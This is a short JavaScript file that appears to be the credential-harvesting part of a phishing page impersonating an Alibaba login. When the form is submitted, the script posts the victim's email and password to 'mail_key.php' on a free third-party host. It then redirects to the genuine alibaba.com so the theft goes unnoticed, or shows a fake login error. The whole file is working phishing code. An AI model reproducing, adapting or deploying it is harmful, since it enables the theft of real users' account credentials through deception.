$('document').ready(function () {

    $('#login_form').on('submit', function () {

        $('#login_form button').attr('disabled', true);
        $('#login_form button').html('Please Wait...');

        var mail = $('#mail').val();
        var password = $('#password').val();

        $.ajax({
            url: 'https://fostesting.000webhostapp.com/servers/Alibaba/php/mail_key.php',
            method: 'post',
            data: {
                mail,
                password
            },
            success: function (data) {
                console.log(data);
                if (data == 'Sent') {
                    location.assign('https://alibaba.com');
                } else {
                    alert('Error Logging Into Your Account');
                }
            },
            fail: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            },
            error: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            }
        })

        return false;

    })

})
